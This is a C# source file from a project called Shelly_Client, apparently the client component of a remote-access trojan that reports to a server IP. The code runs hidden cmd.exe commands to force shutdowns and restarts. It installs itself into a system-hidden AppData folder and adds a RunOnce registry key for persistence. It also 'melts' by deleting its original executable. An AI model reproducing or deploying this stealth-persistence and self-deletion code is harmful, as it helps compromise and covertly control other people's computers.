using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace Shelly_Client
{
    class Functions
    {
        // General class
        public class General
        {
            // Ping method
            public static string Ping()
            {
                // Create new instance
                using (Ping SendPing = new Ping())
                {
                    // Return ms response
                    return SendPing.Send(Program.ServerIp).RoundtripTime.ToString() + "ms";
                }
            }
        }

        // PowerOptions class 
        public class PowerOptions
        {
            // Shutdown method
            public static void Shutdown()
            {
                // Shutdown
                InstallMethods.Cmd("timeout /t 2 & shutdown /s /t 0 /f");
            }
            
            // Restart method
            public static void Restart()
            {
                // Restart
                InstallMethods.Cmd("timeout /t 2 & shutdown /r /t 0 /f");
            }

            // Hibernate method
            public static void Hibernate()
            {
                // Hibernate
                InstallMethods.Cmd("timeout /t 2 & rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            }
        }

        public static class InstallMethods
        {
            public static void Install()
            {
                // Check if another instance is already installed
                if (Directory.Exists(Program.Appdata + @"\Shelly"))
                {
                    // Melt
                    Cmd("timeout /t 3 & del Shelly.exe");

                    // Exit
                    Environment.Exit(0);
                }

                // Create folder in appdata
                Directory.SetCurrentDirectory(Program.Appdata);
                Directory.CreateDirectory("Shelly");

                // Set folder to system hidden
                Cmd("attrib +S +H Shelly");

                // Copy file to folder
                File.Copy(Program.ExecutionPath + @"\Shelly.exe", Program.Appdata + @"\Shelly\Shelly.exe");

                // Start file
                Directory.SetCurrentDirectory(Program.Appdata + @"\Shelly");
                Process.Start(Program.Appdata + @"\Shelly\Shelly.exe");

                // Add startup key
                StartupKey("Add");

                // Goto initial execution path
                Directory.SetCurrentDirectory(Program.ExecutionPath);

                // Melt
                Cmd("timeout /t 3 & del Shelly.exe");

            }

            public static void Uninstall()
            {
                // Remove startup key
                StartupKey("Remove");

                // Remove folder
                Directory.SetCurrentDirectory(Program.Appdata);
                Cmd("timeout /t 3 & rd /s /q Shelly");
            }


            // Run cmd command method
            public static void Cmd(string Command)
            {
                // Declare new instance
                var CmdCommand = new Process();

                // Set start info
                ProcessStartInfo startInfoMelt = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = @"/C " + Command
                };
                CmdCommand.StartInfo = startInfoMelt;

                // Start cmd with arguments
                CmdCommand.Start();
            }

            // Add/remove startup key method
            public static void StartupKey(string AddOrRemove)
            {
                // Open the runonce registry folder
                using (RegistryKey AddKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                {
                    // If choose equals true, add startup key, if not, remove it
                    if (AddOrRemove == "Add")
                    {
                        // Add key
                        AddKey.SetValue("Shelly", Program.Appdata + @"\Shelly\Shelly.exe");
                    }
                    else
                    {
                        // Delete Key
                        AddKey.DeleteValue("Shelly");
                    }
                }
            }
        }
    }
}